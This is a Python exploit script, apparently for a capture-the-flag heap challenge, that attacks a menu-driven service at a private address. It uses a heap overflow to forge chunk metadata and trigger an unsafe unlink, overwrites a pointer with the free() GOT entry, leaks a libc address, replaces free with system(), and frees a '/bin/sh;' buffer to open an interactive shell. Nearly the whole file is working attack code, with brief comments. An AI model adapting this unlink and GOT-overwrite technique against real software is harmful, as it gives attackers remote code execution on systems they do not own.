from zio import *

def list_shellcode(io):
	io.read_until('>')
	io.writeline('1')
	io.read_until('SHELLC0DE 0: ')
	return l64(io.read(8 * 2).decode('hex'))
	
def new_shellcode(io, sh):
	io.read_until('>')
	io.writeline('2')
	io.read_until(':')
	io.writeline(str(len(sh)))
	io.read_until(':')
	io.write(sh)
	
def edit_shellcode(io, index, sh):
	io.read_until('>')
	io.writeline('3')
	io.read_until(':')
	io.writeline(str(index))
	io.read_until(':')
	io.writeline(str(len(sh)))
	io.read_until(':')
	io.write(sh)
	
def delete_shellcode(io, index):
	io.read_until('>')
	io.writeline('4')
	io.read_until(':')
	io.writeline(str(index))
	
def main():
	target = ('192.168.1.201', 2016)
	timeout = 0
	print_read = COLORED(RAW, 'red')
	print_write = COLORED(RAW, 'green')
	
	io = zio(target, timeout, print_read, print_write)
	
	#create new shellcode
	#get_max_fast() return 0x80 on x64, make second_chunk as a small chunk
	first_size = 0x30
	second_size = 0xa0
	
	new_shellcode(io, 'a' * first_size)						#at 0x0079e010
	new_shellcode(io, 'b' * second_size)					#at 0x0079e050
	new_shellcode(io, '/bin/sh;')
	
	#make shellcode 0 buffer overflow next chunk
	PREV_IN_USE = 0x1
	prev_size_0 = l64(0)
	size_0 = l64(first_size | PREV_IN_USE)			
	fd_0 = l64(0x006016d0 - 0x18)							#bk offset
	bk_0 = l64(0x006016d0 - 0x10)							#fd offset
	user_data = 'm' * (first_size - 0x20)					#0x20 = chunk header size
	prev_size_1 = l64(first_size)
	size_1 = l64((second_size + 0x10) & (~PREV_IN_USE))		#make first chunk free
	
	edit_shellcode(io, 0, prev_size_0 + size_0 + fd_0 + bk_0 + user_data + prev_size_1 + size_1)
	
	#begin
	delete_shellcode(io, 1)
	
	#after unlink then *0x6016d0 == 0x6016b8, let's corrupt 0x6016d0 with libc_free_got
	rubbish = 'whatthis'
	is_shellcode_exist = l64(0x1)
	shellcode_size = l64(0x8)
	libc_free_got = l64(0x00601600)
	
	edit_shellcode(io, 0, rubbish + is_shellcode_exist + shellcode_size + libc_free_got)
	
	#find system address
	free_address = list_shellcode(io)
	system_address = free_address - 0x82df0 + 0x46640
	
	#rewrite 0x006016d0
	edit_shellcode(io, 0, l64(system_address))
	
	#just free
	delete_shellcode(io, 2)
	
	io.interact()
	
main()
